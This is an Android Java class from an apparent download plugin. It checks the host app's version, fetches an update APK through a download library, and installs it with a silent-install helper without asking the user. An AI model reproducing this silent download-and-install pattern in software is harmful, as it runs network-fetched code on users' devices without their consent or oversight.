package com.tiho.dlplugin.update;

import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Handler;

import com.tiho.base.base.md.Md;
import com.tiho.base.base.md.Md.IDownLoadCB;
import com.tiho.base.base.md.Md.MdCbData;
import com.tiho.base.base.md.Md.MdDownloadData;
import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.Global;
import com.tiho.dlplugin.common.CommonInfo;
import com.tiho.dlplugin.util.SilentInstall;

import java.io.File;
import java.util.ArrayList;

public class HostApkUpdate {
    private Context mContext;
    private String mPackageName = Global.sHostPackageName;

    public HostApkUpdate(Context context) {
        this.mContext = context;
    }

    public void checkVersion(final Handler mHandler) {
        String commonkey = CommonInfo.getInstance(mContext).getCommonkey();
        String xplayagent = CommonInfo.getInstance(mContext).getXplayAgent();
        Md md = new Md(mContext);
        ArrayList<MdDownloadData> lists = checkParam(md);
        md.mdDownload(lists, new IDownLoadCB() {
            @Override
            public void callback(int result, MdCbData data, Object obj) {
                if (result != Md.MDLR_STA_PROGRESS) {
                    LogManager.LogShow("result = " + result + ", obj = " + obj);
                    if (result == Md.MDRES_REALDL_OK) {
                        LogManager.LogShow("update complete");
                        if (SilentInstall.bgInstallSupport(mContext)) {
                            LogManager.LogShow(mPackageName + "下载成功，开始静默安装, obj = " + obj);
                            SilentInstall.SilentInstallApk(mContext, (String) obj);
                        }
                    } else if (result == Md.MDLR_STA_NOUPDATA) {
                        LogManager.LogShow("is last version");
                    }
                }
            }
        }, commonkey, xplayagent);
    }


    private ArrayList<MdDownloadData> checkParam(Md md) {
        ArrayList<Md.MdDownloadData> lists = new ArrayList<>();
        File file =mContext.getExternalFilesDir(null);
        Md.MdDownloadData item = new Md.MdDownloadData();
        if(file==null)
            md.setRootPath(mContext.getFilesDir().getPath());
        else
            md.setRootPath(file.getPath());
        item.appid = mPackageName;
        item.appver = getAppVer(mPackageName);
        item.type = 5;
        lists.add(item);
        return lists;
    }

    private int getAppVer(String packageName) {
        int version = 0;
        PackageManager pm = mContext.getPackageManager();
        PackageInfo pi;
        try {
            pi = pm.getPackageInfo(packageName, 0);
            version = pi.versionCode;
        } catch (NameNotFoundException e) {
            e.printStackTrace();
        }
        return version;
    }
}
